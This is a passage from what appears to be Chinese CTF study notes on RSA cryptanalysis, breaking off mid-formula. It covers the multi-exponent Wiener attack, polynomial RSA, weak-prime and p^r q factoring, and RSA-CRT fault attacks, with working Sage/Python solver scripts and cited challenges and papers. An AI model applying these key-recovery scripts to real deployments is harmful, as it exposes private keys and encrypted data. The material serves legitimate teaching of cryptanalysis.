123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236from Crypto.Util.number import *isdigit = lambda x: ord(&#x27;0&#x27;) &lt;= ord(x) &lt;= ord(&#x27;9&#x27;)def my_permutations(g, n): sub = [] res = [] def dfs(s, prev): if len(s) == n: res.append(s[::]) for i in g: if i in s or i &lt; prev: continue s.append(i) dfs(s, max(prev, i)) s.remove(i) dfs(sub, 0) return resclass X3NNY(object): def __init__(self, exp1, exp2): self.exp1 = exp1 self.exp2 = exp2 def __mul__(self, b): return X3NNY(self.exp1 * b.exp1, self.exp2 * b.exp2) def __repr__(self): return &#x27;%s = %s&#x27; % (self.exp1.expand().collect_common_factors(), self.exp2)class X_Complex(object): def __init__(self, exp): i = 0 s = &#x27;%s&#x27; % exp while i &lt; len(s): if isdigit(s[i]): num = 0 while i &lt; len(s) and isdigit(s[i]): num = num*10 + int(s[i]) i += 1 if i &gt;= len(s): self.b = num elif s[i] == &#x27;*&#x27;: self.a = num i += 2 elif s[i] == &#x27;/&#x27;: i += 1 r = 0 while i &lt; len(s) and isdigit(s[i]): r = r*10 + int(s[i]) i += 1 self.b = num/r else: i += 1 if not hasattr(self, &#x27;a&#x27;): self.a = 1 if not hasattr(self, &#x27;b&#x27;): self.b = 0def WW(e, d, k, g, N, s): return X3NNY(e*d*g-k*N, g+k*s)def GG(e1, e2, d1, d2, k1, k2): return X3NNY(e1*d1*k2- e2*d2*k1, k2 - k1)def W(i): e = eval(&quot;e%d&quot; % i) d = eval(&quot;d%d&quot; % i) k = eval(&quot;k%d&quot; % i) return WW(e, d, k, g, N, s)def G(i, j): e1 = eval(&quot;e%d&quot; % i) d1 = eval(&quot;d%d&quot; % i) k1 = eval(&quot;k%d&quot; % i) e2 = eval(&quot;e%d&quot; % j) d2 = eval(&quot;d%d&quot; % j) k2 = eval(&quot;k%d&quot; % j) return GG(e1, e2, d1, d2, k1, k2)def R(e, sn): # min u max v ret = X3NNY(1, 1) n = max(e) nn = len(e) l = set(i for i in range(1, n+1)) debug = &#x27;&#x27; u, v = 0, 0 for i in e: if i == 1: ret *= W(1) debug += &#x27;W(%d)&#x27; % i nn -= 1 l.remove(1) u += 1 elif i &gt; min(l) and len(l) &gt;= 2*nn: ret *= G(min(l), i) nn -= 1 debug += &#x27;G(%d, %d)&#x27; % (min(l), i) l.remove(min(l)) l.remove(i) v += 1 else: ret *= W(i) l.remove(i) debug += &#x27;W(%d)&#x27; % i nn -= 1 u += 1 # print(debug, end = &#x27; &#x27;) return ret, u/2 + (sn - v) * adef H(n): if n == 0: return [0] if n == 2: return [(), (1,), (2,), (1, 2)] ret = [] for i in range(3, n+1): ret.append((i,)) for j in range(1, i): for k in my_permutations(range(1, i), j): ret.append(tuple(k + [i])) return H(2) + ret def CC(exp, n): cols = [0 for i in range(1&lt;&lt;n)] # split exp texps = (&#x27;%s&#x27; % exp.exp1.expand()).strip().split(&#x27; - &#x27;) ops = [] exps = [] for i in range(len(texps)): if texps[i].find(&#x27; + &#x27;) != -1: tmp = texps[i].split(&#x27; + &#x27;) ops.append(0) exps.append(tmp[0]) for i in range(1, len(tmp)): ops.append(1) exps.append(tmp[i]) else: ops.append(0) exps.append(texps[i]) if exps[0][0] == &#x27;-&#x27;: for i in range(len(exps)): ops[i] = 1-ops[i] exps[0] = exps[0][1:] else: ops[0] = 1 # find e and N l = [] for i in range(len(exps)): tmp = 1 if ops[i] else -1 en = [] j = 0 while j &lt; len(exps[i]): if exps[i][j] == &#x27;e&#x27;: num = 0 j += 1 while isdigit(exps[i][j]): num = num*10 + int(exps[i][j]) j += 1 tmp *= eval(&#x27;e%d&#x27; % num) en.append(num) elif exps[i][j] == &#x27;N&#x27;: j += 1 num = 0 if exps[i][j] == &#x27;^&#x27;: j += 1 while isdigit(exps[i][j]): num = num*10 + int(exps[i][j]) j += 1 if num == 0: num = 1 tmp *= eval(&#x27;N**%d&#x27; % num) else: j += 1 if tmp == 1 or tmp == -1: l.append((0, ())) else: l.append((tmp, tuple(sorted(en)))) # construct h mp = H(n) for val, en in l: cols[mp.index(en)] = val #print(cols) return colsdef EWA(n, elist, NN, alpha): mp = H(n) var(&#x27;a&#x27;) S = [X_Complex(n*a)] cols = [[1 if i == 0 else 0 for i in range(2^n)]] for i in mp[1:]: eL, s = R(i, n) cols.append(CC(eL, n)) S.append(X_Complex(s)) alphaA,alphaB = 0, 0 for i in S: alphaA = max(i.a, alphaA) alphaB = max(i.b, alphaB) #print(alphaA, alphaB) D = [int(NN^((alphaA-S[i].a)*alpha + (alphaB - S[i].b))) for i in range(len(S))] #print(D) kw = &#123;&#x27;N&#x27;: NN&#125; for i in range(len(elist)): kw[&#x27;e%d&#x27; % (i+1)] = elist[i] print(cols) B = Matrix(ZZ, Matrix(cols).T(**kw)) * diagonal_matrix(ZZ, D) L = B.LLL(0.5) v = Matrix(ZZ, L[0]) x = v * B**(-1) phi = int(x[0,1]/x[0,0]*elist[0]) return phidef attack(NN, elist, alpha): phi = EWA(len(elist), elist, NN, alpha) print(phi)elist = [ ]NN=alpha = 400./2048for i in range(1, len(elist)+1): var(&quot;e%d&quot; % i) var(&quot;d%d&quot; % i) var(&quot;k%d&quot; % i)g, N, s = var(&#x27;g&#x27;), var(&#x27;N&#x27;), var(&#x27;s&#x27;)for i in range(len(elist)): elist[i] = Integer(elist[i])attack(NN, elist, alpha)phi = c= d=inverse(65537,int(phi))m = pow(c,d,NN)print(long_to_bytes(int(m))) 参考：西湖论剑 2021 - WienerStudyTwice 参考Paper Common Modulus Attacks on Small Private Exponent RSA and Some Fast Variants (in Practice) Extending Wiener’s Attack in the Presence of Many Decrypting Exponents ​ 多项式RSA在整数RSA原理基础上将多项式代入分析： 在有限域上选取两个不可约多项式 $g(p),g(q)$，$g(n)=g(p) \\cdot g(q)$，计算出 $g(n)$ 的欧拉函数 $\\varphi(g(n))=\\varphi$， 选取一个整数 $e$ 作为公钥，$e$ 与 $\\varphi$ 是互素的，那么对于明文 $g(m)$，加密过程为 $g(m)^e \\equiv g(c) \\pmod {g(n)}$， 计算私钥 $d$ 满足 $ed \\equiv 1 \\pmod \\varphi$，则 $g(c)^d \\equiv (g(m)^e)^d \\equiv g(m)^{ed} \\equiv g(m)^{\\varphi+1} \\pmod {g(n)}$， 同样考虑 $g(n)$ 与 $g(m)$ 互素，欧拉定理对于多项式亦成立， 得到 $g(m)^{\\varphi+1} \\equiv g(m) \\pmod {g(n)}$，所以 $g(c)^d \\equiv g(m) \\pmod {g(n)}$。 显然RSA对于整数的体制可以适用于有限域上的多项式。 ★注意： 对于素数 $x$，$\\varphi(x)=x-1$，但是对于不可约多项式 $g(x)$，$\\varphi(g(x))=p^n-1$。（此 $p$ 为 $GF(p)$ 的模，此 $n$ 为多项式最高项次数） 原因： 由欧拉函数定义本身，欧拉函数是小于 $n$ 的所有与 $n$ 互质的数的个数。 多项式的欧拉函数则类似，表示不高于 $g(x)$ 幂级的环内所有多项式中，与 $g(x)$ 无公因式（非1）的其他多项式的个数，所以每一个不高于 $g(x)$ 幂级的环内多项式（除了它自己）均满足此条件。 1234567891011121314151617181920212223#脚本1#Sage#已知p,n,m^ep= P = PolynomialRing(Zmod(p), name = &#x27;x&#x27;)x = P.gen()e = n = c =#分解Nq1, q2 = n.factor()q1, q2 = q1[0], q2[0]#求φ，注意求法，phi = (p**q1.degree() - 1) * (p**q2.degree() - 1)assert gcd(e, phi) == 1d = inverse_mod(e, phi)m = pow(c,d,n)#取多项式系数flag = bytes(m.coefficients())print(&quot;Flag: &quot;, flag.decode()) 1234567891011121314151617181920212223242526#脚本2#Sage#已知p=2,n,e,cp = P = PolynomialRing(GF(p), name = &#x27;x&#x27;)x = P.gen()e = n = R.&lt;a&gt; = GF(2^2049)c = []q1, q2 = n.factor()q1, q2 = q1[0], q2[0]phi = (p**q1.degree() - 1) * (p**q2.degree() - 1)assert gcd(e, phi) == 1d = inverse_mod(e, phi)ans = &#x27;&#x27;for cc in c: cc = P(R.fetch_int(cc)) m = pow(cc,d,n) m = R(P(m)).integer_representation() print(m) ans += chr(m)print(ans) 12345#Sage#x.nbits()==2^32poly = sum(e * x^i for i,e in enumerate(Integer(n).digits(2^32)))(p, _), (q, _) = poly.factor_list()p, q = p(x=2^32), q(x=2^32) 参考： 0ctf - babyrsa watevrCTF 2019 - Swedish RSA InCTF 2020 - PolyRSA Polynomial based RSA Crypto CTF2020 - Decent RSA SecurityFest CTF 2022 - small rsa ​ Weak prime factors （p具线性特征）适用情况：$p$ 满足 $ap=u_0+M_1u_1+\\cdots+M_ku_k$ 先根据 $n$ 确定 $M$ 的大小，再根据 $M$ 选取符合要求的 $k$ 和 $c$，然后构造一个格如下： $M(\\mathcal{L})=\\begin{bmatrix}{1}&amp;{0}&amp;{0}&amp;{\\cdots}&amp;{0}&amp;{CM^{2k}} \\newline{0}&amp;{1}&amp;{0}&amp;{\\cdots}&amp;{0}&amp;{CM^{2k-1}} \\newline {\\vdots}&amp;{\\vdots}&amp;{\\vdots}&amp;{\\ddots}&amp;{\\vdots}&amp;{\\vdots} \\newline {0}&amp;{0}&amp;{0}&amp;{\\cdots}&amp;{1}&amp;{CM} \\newline {0}&amp;{0}&amp;{0}&amp;{\\cdots}&amp;{0}&amp;{-CN} \\newline \\end{bmatrix}$ 用LLL算法进行格基规约，将规约后的某个向量作为多项式系数，再对多项式进行分解，即可完成对 $n$ 的分解。 参考 Factoring RSA moduli with weak prime factors N1CTF2020 - easyRSA 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from tqdm import tqdmimport gmpy2class success(Exception): passdef attack_weak_prime(basenum, exp, n): m = basenum^exp k = len(n.str(base=basenum))//(2*exp) + 1 c = gmpy2.iroot(2*k^3, int(2)) # assert c[1] == True tmp = int(c[0]) try: for c in tqdm(range(1, tmp)): amount = 2*k+1 M = Matrix(RationalField(), amount, amount) for i in range(amount): M[i, i] = 1 M[i, amount-1] = c*m^(2*k-i) M[amount-1, amount-1] = -c*n new_basis = M.LLL(delta=0.75) for j in range(amount): last_row = list(new_basis[j]) last_row[-1] = last_row[-1]//(-c) poly = sum(e * x^(k*2-i) for i,e in enumerate(last_row)) fac = poly.factor_list() if len(fac) == 2: p_poly, q_poly = fac p_coefficient = p_poly[0].list() q_coefficient = q_poly[0].list() ap = sum(m^i * j for i,j in enumerate(p_coefficient)) bq = sum(m^i * j for i,j in enumerate(q_coefficient)) p = gcd(ap, n) q = gcd(bq, n) if (p*q == n) and (p != 1) and (q != 1): raise success except: print (&#x27;n =&#x27;, n) print (&#x27;p =&#x27;, p) print (&#x27;q =&#x27;, q) print (&#x27;p*q == n ?&#x27;, bool(p*q == n))if __name__ == &#x27;__main__&#x27;: print (&#x27;[+] Weak Prime Factorization Start!&#x27;) print (&#x27;-------------------------------------------------------------------------------------------------------------------------------&#x27;) basenum, exp = (3, 66) n = 32846178930381020200488205307866106934814063650420574397058108582359767867168248452804404660617617281772163916944703994111784849810233870504925762086155249810089376194662501332106637997915467797720063431587510189901 ​ p多次幂因子适用情况：$N=p^rq$ 情形1 条件：$(N,e)$ 满足 $ex-\\varphi(N)y=z$，其中 $x$ 与 $\\lvert z \\rvert$ 为小参数。 $f(x) = ex-z \\equiv 0 \\pmod {p^{r-1}}$ 计算 $\\gcd(ex - z,N)=g$，则 $p = \\begin{cases} g^{\\frac{1}{r-1}},\\text{if } g=p^{r-1} \\newline g^{\\frac{1}{r}},\\text{if } g=p^{r} \\newline \\frac{N}{g},\\text{if } g=p^{r-1}q \\end{cases}$ 1234P.&lt;x&gt; = PolynomialRing(Zmod(n))f = e * x - broot = f.monic().small_roots(X=2**672,beta=0.75)[0]g = gcd(int(e * root - b),n3) 情形2 条件：小 $\\lvert d_1-d_2 \\rvert$，$\\lvert d_1-d_2 \\rvert \\lt N^{\\frac{r(r-1)}{(r+1)^2}}$。 $f(x) = e_1e_2(d_1-d_2) - (e_2-e_1) \\equiv 0 \\pmod {p^{r-1}}$ 等价于 $g(x) = x-a \\equiv 0 \\pmod {p^{r-1}}$，其中 $a \\equiv (e_2-e_1)(e_1e_2)^{-1} \\pmod {N}$。 计算 $\\gcd(e_1e_2x - (e_2-e_1),N)=g$，则 $p = \\begin{cases} g^{\\frac{1}{r-1}},\\text{if } g=p^{r-1} \\newline g^{\\frac{1}{r}},\\text{if } g=p^{r} \\newline \\frac{N}{g},\\text{if } g=p^{r-1}q \\end{cases}$ 1234P.&lt;x&gt; = PolynomialRing(Zmod(n))f = e1*e2*x - e1 + e2root = f.monic().small_roots(X=2**672,beta=0.75)[0]g = gcd(int(e1*e2*root - e1 + e2),n) 情形3 条件：$N_1=p_1^rq_1,N_2=p_2^rq_2$，小 $\\lvert p_1-p_2 \\rvert$，$\\lvert p_1-p_2 \\rvert \\lt \\cfrac{p_1}{2rq_1q_2}$。 $\\left| \\cfrac{N_2}{N_1} - \\cfrac{q_2}{q_1} \\right| = \\cfrac{q_1q_2 \\lvert p_1^r - p_2^r \\rvert}{q_1^2p_1^r} &lt; \\cfrac{1}{2q_1^2}$ 利用 $\\cfrac{N_2}{N_1}$ 的连分数展开对应的渐进分数逼近 $\\cfrac{q_2}{q_1}$。 12345678910111213cf = continued_fraction(n1/n2)fracs = cf.convergents()for xx in tqdm(fracs): q1 = xx.numerator() q2 = xx.denominator() if q1.nbits() in range(511, 513) and q2.nbits() in range(511, 513): if n1 % q1 == 0: print(q1) assert n1 % q1 == 0 p1 = int((n1 // q1)^(1/2)) p2 = int((n2 // q2)^(1/2)) assert p1^2 * q1 == n1 break 参考： New attacks on RSA with Moduli $N = p^rq$ D^3CTF 2022 - d3factor ​ RSA-CRT 故障注入攻击 RSA-CRT fault attack 假设在计算 $S_q$ 时发生了错误，$S_q=m_q^{d_q} \\bmod q$，$m_q=m \\bmod q$，$d_q=d \\bmod (q-1)$， 正确签名：$S=S_p \\cdot(q^{-1} \\bmod p) \\cdot q+S_q \\cdot(p^{-1} \\bmod q) \\cdot p$， 错误签名：$\\hat{S} = S_p \\cdot (q^{-1} \\bmod p) \\cdot q + \\hat{S_q} \\cdot (p^{-1} \\bmod q) \\cdot p$， 则 $S - \\hat{S} = (S_q - \\hat{S_q}) \\cdot (p^{-1} \\bmod q) \\cdot p$，即有 $p=\\gcd(S-\\hat{S},N)$。 或由错误签名 $\\hat{S}$，有 $p=\\gcd(S’^e-m,N)$。 错误模攻击 有明文 $m$ 经对应编码后的 $\\sigma_p = \\mu(m)^d \\bmod p, \\sigma_q = \\mu(m)^d \\bmod q$，生成RSA-CRT签名 $\\sigma = (\\sigma_p\\cdot\\alpha + \\sigma_q\\cdot\\beta) \\bmod N$，其中参数 $\\alpha = q \\cdot (q^{-1} \\bmod p),\\beta = p \\cdot (p^{-1} \\bmod q)$。 利用错误模注入技术得到错误签名 $\\sigma’$，即 $\\sigma’ = (\\sigma_p\\cdot\\alpha + \\sigma_q\\cdot\\beta) \\bmod N’$， 对生成的两种签名 $\\sigma$ 和 $\\sigma’$ 使用CRT可计算出 $v=(\\sigma_p\\cdot\\alpha + \\sigma_q\\cdot\\beta) \\bmod (N \\cdot N’)$。 针对 $l \\ge 5$ 的编码后消息进行分析，通过计算签名对 $(\\sigma,\\sigma’)$ 分解 $N$ 的攻击方法： 对所有的 $i$，计算出对应的整数 $v_i= \\text{CRT}_{N,N’}(\\sigma_i,\\sigma_i’)$，这些对应的 $v_i$ 构成 $\\mathbb{Z}^l$ 上的向量 $\\mathbf{v}=(v_1,\\cdots,v_i)$； 利用LLL定理计算出垂直于向量 $\\mathbf{v}$ 的正交格 $\\mathbf{v}^{\\perp}$ 的规约基 $\\mathbf{b}_1,\\cdots,\\mathbf{b}_{l-1}$，其中所有的向量和格的分布都是在 $\\mathbb{Z}^l$ 内。通过对存在于 $\\mathbb{Z}^{1+l}$ 中的格应用LLL定理，即对如下矩阵使用LLL定理： $\\begin{pmatrix} kv_1 &amp; 1 &amp; &amp; 0 \\newline \\vdots&amp; &amp; \\ddots &amp; \\newline kv_l &amp; 0 &amp; &amp; 1 \\end{pmatrix}$ 其中 $k$ 为合适的大常量，并去除计算出来的向量的第1个元素； 前 $l-2$ 个向量 $\\mathbf{b}_1,\\cdots,\\mathbf{b}_{l-2}$ 将生成秩为 $l-2$ 的格 $L’$，再次利用LLL定理来计算出正交格 $(L’)^{\\perp}$ 的规约基 $\\mathbf{x}’,\\mathbf{y}’$。同样可以通过对如下矩阵使用LLL定理得到对应的规约基： $\\begin{pmatrix} k’b_{1,1} &amp; \\cdots &amp; k’b_{l-2,1} &amp; 1 &amp; &amp; 0 \\newline \\vdots&amp; &amp; \\vdots &amp; &amp; \\ddots &amp; \\newline k’b_{1,l} &amp; \\cdots &amp; k’b_{l-2,l}&amp; 0 &amp; &amp; 1 \\end{pmatrix}$ 同步骤2，保留计算出来的向量的最后 $l$ 个元素； 将所有长度不超过 $\\sqrt{lN}$ 的并在 $(L’)^{\\perp}$ 内的向量 $\\mathbf{z}=a \\mathbf{x}’+b \\mathbf{y}’$ 列举出来，对符合条件的向量 $\\mathbf{z}$，计算出 $\\gcd(\\mathbf{v}-\\mathbf{z},N)$，可以得出 $N$ 中任何可能的素因子。 12345678910111213141516171819202122232425262728from tqdm import tqdmimport gmpy2,sysdef orthogonal_lattice(B): LB = B.transpose().left_kernel(basis=&quot;LLL&quot;).basis_matrix() return LB cs = []s = []l = 6v = []for i in range(len(cs_)): v.append(int(crt([s_[i], cs_[i]], [n, N]))) v = vector(ZZ, v)Lv = orthogonal_lattice(Matrix(v))L1 = orthogonal_lattice(Lv.submatrix(0, 0, l-2, l))x, y = L1for a in tqdm(range(333)): for b in tqdm(range(333)): z = a*x+b*y for each in (v-z): tmp = gcd(each,n) if tmp&gt;1: p = tmp print(p) sys.exit() 参考： Modulus Fault Attacks Against RSA-CRT Signatures 2022巅峰极客 - Learning with Fault ​ 矩阵RSA对于有限域 $\\mathbb{F}_p$ 上的 $n \\times n$ 矩阵构成的一般线性群 $\\text{GL}(n,\\mathbb{F}_p)$，其阶数可以通过以下公式计算： $\\vert\\text{GL}(n,\\mathbb{F}_p)\\vert=(p^n-1)(p^n-p)(p^n-p^2)\\cdots(p^n-p^{n-1})$ 参考：GL(n,Fp)群阶的研究 ​ 其他特别情形 多素数因子（Multi-prime RSA）$n=p_1^{k_1}p_2^{k_2}\\cdots p_m^{k_m} \\\\ \\Rightarrow \\begin{eqnarray}\\varphi(n) &amp;=&amp;\\varphi(p_1^{k_1})\\varphi(p_2^{k_2}) \\cdots \\varphi(p_m^{k_m}) \\\\ &amp;=&amp;(p_1^{k_1-1}\\cdot(p_1-1))(p_2^{k_2-1}\\cdot(p_2-1)) \\cdots (p_m^{k_m-1}\\cdot(p_m-1)) \\end{eqnarray}$ ​ next_prime() 根据素数定理，素数的平均间隔为：$\\cfrac{x}{\\pi(x)} \\approx \\ln(x)$，因此常见的下一个素数比当前素数大一点，一般不会超过1500。 变种1：$n=p \\cdot q \\cdot \\text{nextprime}(p) \\cdot \\text{nextprime}(q)$ 费马因式分解。 ​ 给 e,p,c $c \\equiv m^e \\pmod n \\\\\\Leftrightarrow c_1 \\equiv c \\pmod p \\equiv m^e \\pmod p$ 令 $ed_1 \\equiv 1 \\pmod {(p-1)}$，有 $m \\equiv c^d \\pmod n \\equiv c_1^{d_1} \\pmod p$。 ​ 给 e,d,modinv(q,p),c已知：$p,q$ 同比特位数。 令 $cf=q^{-1} \\bmod p$，有 $q\\cdot cf=1 \\pmod p$。 $ed=1+k(p-1)(q-1)$， 比较比特位数，$k$ 与 $e$ 同长，可爆破 $k$，得 $\\varphi(n)=(p-1)(q-1)=\\cfrac{ed-1}{k}$； 上式 $\\varphi(n) =(p-1)(q-1) \\pmod p=-(q-1) \\pmod p$， 结合 $q\\cdot cf=1 \\pmod p$，即 $q\\cdot cf-1=0 \\pmod p$， 联立： $\\begin{eqnarray} \\varphi(n)&amp;=&amp;(p-1)(q-1)\\\\&amp;=&amp;pq-p-q+1\\\\&amp;=&amp;n-p-q+1 \\end{eqnarray}$ $\\begin{eqnarray} cf\\cdot \\varphi(n)&amp;=&amp;cf\\cdot(n-p-q+1)\\\\&amp;=&amp;cf\\cdot n-cf\\cdot p-cf\\cdot q+cf \\end{eqnarray}$ $\\begin{eqnarray} cf\\cdot \\varphi(n) \\bmod p&amp;=&amp;(cf\\cdot n-cf\\cdot p-cf\\cdot q+cf) \\bmod p\\\\&amp;=&amp;0-0-(cf\\cdot q)+cf \\bmod p\\\\&amp;=&amp;-1+cf \\bmod p \\end{eqnarray}$ 有 $1+cf\\cdot \\varphi(n)-cf=0\\pmod p$， 即$x=1+cf\\cdot \\varphi(n)-cf$ 能被 $p$ 整除； 由费马小定理，存在 $r$ 满足 $r^{p-1}=1 \\pmod p$， $\\begin{eqnarray}r^{\\varphi(n)}&amp;=&amp;(r^{(p-1)})^{(q-1)}\\\\&amp;=&amp;1^{(q-1)} \\pmod p\\\\&amp;=&amp;1 \\pmod p \\end{eqnarray}$， 因对于任意 $r,k_1,k_2$，当 $k_2$ 为 $k_1$ 因子时，$r \\bmod k_2=(r \\bmod k_1) \\bmod k_2$， 故 $r^{\\varphi(n)} \\bmod p=(r^{\\varphi(n)} \\bmod x) \\bmod p=1 \\bmod p=kp$， 已知 $\\varphi(n)$，由 $(r^{\\varphi(n)} \\bmod x) \\bmod p=kp$ 可得到多组 $p$ 的乘积，计算 $\\gcd$ 可得到 $p$； 由 $q\\cdot cf=1 \\pmod p$ 求模逆可得 $q$，再用 $c$ 计算出 $m$。 参考：TSG CTF 2020 - Modulus Amittendus ​ gcd(e,φ(n)) ≠ 1$\\gcd(e,\\varphi(n))\\neq 1$ 时，$e$ 与 $\\varphi(n)$ 不互素， $m^e \\equiv (m^{\\gcd(e,\\varphi(n))})^{\\frac{e}{\\gcd(e,\\varphi(n))}} \\equiv c \\pmod n$，计算 $\\frac{e}{\\gcd(e,\\varphi(n))}$ 的模逆 $d’$， 则 $c^{d’}\\equiv m^{\\gcd(e,\\varphi(n))}\\pmod n$。 当 $\\gcd(e,\\varphi(n))$ 较小时，可以直接对 $c$ 开根，有两种情况： $m^e = c&lt;n$，这种情况直接对 $c$ 开 $e$ 次方即可； $m^e = c&gt;n$，这种情况需要在有限域下对 $c$ 开方，一般先计算 $c_p=c \\bmod p$，$c_q=c \\bmod q$，分别求出 $c_p,c_q$ 在 $c$ 下的 $e$ 次根（可能有多个），然后使用CRT遍历所有组合，分别check得出明文。 当 $\\gcd(e,\\varphi(n))$ 较大时，求 $p,q$ 的 $e$ 次根步骤需要替换为一些有限域开根的高效算法（如AMM算法等）进行计算。 也可以： 假设 $\\gcd(e,\\varphi(n)) = k$，计算 $d= \\text{inv}\\Big(e, \\cfrac{\\varphi(n)}{k}\\Big)$。 参考： De1CTF2019 - Baby RSA 0ctf 2016 - RSA? ​ e|(p-1), e|(q-1)上面的 $\\gcd(e,\\varphi(n))\\neq 1$ 情况不针对 $\\gcd(e,\\varphi(n))= e$，这里对 $e\\mid (p-1),e\\mid (q-1)$ 的特殊情况进行讨论。 解题思路即求解 $m \\bmod p$ 和 $m \\bmod q$ ，再通过CRT还原 $m \\bmod n$。主要难点则是在 $\\text{GF}(p)$ 上求 $e$ 次根。 在有限域上求r-th root有两个常见算法（Adleman-Manders-Miller algorithm和Cipolla-Lehmer algorithm），Namhun Koo提出一种更具一般性的开根算法，且在 $s$ 足够小的时候更高效（$r^{s}\\mid (p-1),r^{s}\\nmid (p-1)$）。 ★参考：NCTF 2019 - easyRSA （Adleman-Manders-Miller rth Root Extraction Method） 本题则为 $e$ 和 $p-1$ （或 $q-1$）的最大公约数就是 $e$ 本身，也就是说 $e\\mid (p-1)$，只有对 $c$ 开 $e$ 次方根才行。 可以将同余方程 $m^e \\equiv c \\pmod n$ 化成 $\\begin{cases} m^e \\equiv c \\pmod p \\\\ m^e \\equiv c \\pmod q \\end{cases}$ 然后分别在 $\\text{GF}(p)$ 和 $\\text{GF}(q)$ 上对 $c$ 开 $e$ 次方根，再用CRT组合一下即可得到在 $\\bmod n$ 下的解。 问题是，如何在有限域内开根？ 这里 $e$ 与 $p-1$ 和 $q-1$ 都不互素，不能简单地求个逆元就完事。 这种情况下，开平方根可以用Tonelli–Shanks algorithm，Wiki说这个算法可以扩展到开n次方根。 在这篇paper里给出了具体的算法：Adleman-Manders-Miller rth Root Extraction Method。 这个算法只能开出一个根，实际上开 $e$ 次方，最多会有 $e$ 个根（这题的情况下有0x1337个根）。 如何找到其他根？ StackOverflow – Cube root modulo P 给出了方法。 如何找到所有的primitive 0x1337th root of 1? StackExchange – Finding the n-th root of unity in a finite field 给出了方法。 Exploit（以 e=0x1337​ 为例） 先用Adleman-Manders-Miller rth Root Extraction Method在 $\\text{GF}(p)$ 和 $\\text{GF}(q)$ 上对 $c$ 开 $e$ 次方根，分别得到一个解。大概不到10秒。 然后去找到所有的0x1336个primitive nth root of 1，乘以上面那个解，得到所有的0x1337个解。大概1分钟。 再用CRT对 $\\text{GF}(p)$ 和 $\\text{GF}(q)$ 上的两组0x1337个解组合成 $\\bmod n$ 下的解，可以得到0x1337**2=24196561个 $\\bmod n$ 的解。最后能通过check()的即为flag。大概十几分钟。 12345678910111213141516#脚本1#Sagec = p = q = e = for mp in GF(p)(c).nth_root(e, all=True): for mq in GF(q)(c).nth_root(e, all=True): m = crt([ZZ(mp), ZZ(mq)], [p, q]) try: res = bytes.fromhex(hex(m)[2:]) if res.isascii(): print(res) except: pass 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#脚本2#Sageimport randomimport time# About 3 seconds to rundef AMM(o, r, q): start = time.time() print(&#x27;\\n----------------------------------------------------------------------------------&#x27;) print(&#x27;Start to run Adleman-Manders-Miller Root Extraction Method&#x27;) print(&#x27;Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;&#x27;.format(r, o, q)) g = GF(q) o = g(o) p = g(random.randint(1, q)) while p ^ ((q-1) // r) == 1: p = g(random.randint(1, q)) print(&#x27;[+] Find p:&#123;&#125;&#x27;.format(p)) t = 0 s = q - 1 while s % r == 0: t += 1 s = s // r print(&#x27;[+] Find s:&#123;&#125;, t:&#123;&#125;&#x27;.format(s, t)) k = 1 while (k * s + 1) % r != 0: k += 1 alp = (k * s + 1) // r print(&#x27;[+] Find alp:&#123;&#125;&#x27;.format(alp)) a = p ^ (r**(t-1) * s) b = o ^ (r*alp - 1) c = p ^ s h = 1 for i in range(1, t): d = b ^ (r^(t-1-i)) if d == 1: j = 0 else: print(&#x27;[+] Calculating DLP...&#x27;) j = - discrete_log(a, d) print(&#x27;[+] Finish DLP...&#x27;) b = b * (c^r)^j h = h * c^j c = c ^ r result = o^alp * h end = time.time() print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) print(&#x27;Find one solution: &#123;&#125;&#x27;.format(result)) return resultdef findAllPRoot(p, e): print(&quot;Start to find all the Primitive &#123;:#x&#125;th root of 1 modulo &#123;&#125;.&quot;.format(e, p)) start = time.time() proot = set() while len(proot) &lt; e: proot.add(pow(random.randint(2, p-1), (p-1)//e, p)) end = time.time() print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) return prootdef findAllSolutions(mp, proot, cp, p): print(&quot;Start to find all the &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;.&quot;.format(e, cp, p)) start = time.time() all_mp = set() for root in proot: mp2 = mp * root % p assert(pow(mp2, e, p) == cp) all_mp.add(mp2) end = time.time() print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) return all_mpc = p = q = e = 0x1337cp = c % pcq = c % qmp = AMM(cp, e, p)mq = AMM(cq, e, q)p_proot = findAllPRoot(p, e)q_proot = findAllPRoot(q, e)mps = findAllSolutions(mp, p_proot, cp, p)mqs = findAllSolutions(mq, q_proot, cq, q)print(mps, mqs)def check(m): h = m.hex() if len(h) &amp; 1: return False if bytes.fromhex(h).startswith(b&#x27;NCTF&#x27;): print(bytes.fromhex(h)) return True else: return False# About 16 mins to run 0x1337^2 == 24196561 times CRTstart = time.time()print(&#x27;Start CRT...&#x27;)for mpp in mps: for mqq in mqs: solution = CRT_list([int(mpp), int(mqq)], [p, q]) if check(solution): print(solution) print(time.time() - start)end = time.time()print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) ​ SMUPE 问题（不同N,e加密线性关系明文）a system of univariate polynomial equations problem = 一元多项式方程组求解问题 定义 $k$ 是一个整数，$N$ 为满足RSA算法的模数，$\\delta$ 是多项式的阶。有 $N_i&lt;N_{i+1},\\delta_i \\in N\\quad(i=1,2,\\cdots,k)$ 多项式方程组表示如下, 目的是求解 $x$： $\\begin{cases} f_1(x)\\equiv 0 \\pmod {N_1}\\newline f_2(x)\\equiv 0 \\pmod {N_2} \\newline {\\vdots} \\newline f_k(x)\\equiv 0 \\pmod {N_k} \\end{cases}$ 求解条件 Alexander May, Maike Ritzenhofent提出一种求解方法，简单地说当多项式的阶 $\\delta$ 满足以下情况时可解（$\\delta$ 是多项式的阶）： $\\sum\\limits_{i=1}^k \\cfrac{1}{\\delta_i} \\geq 1$ 具体描述： 令 $(f_i,\\delta_i,N_i) \\quad(i=1,2,\\cdots,k)$ 作为SMUPE问题的首一多项式组， 定义 $M=\\prod\\limits_{i=1}^k 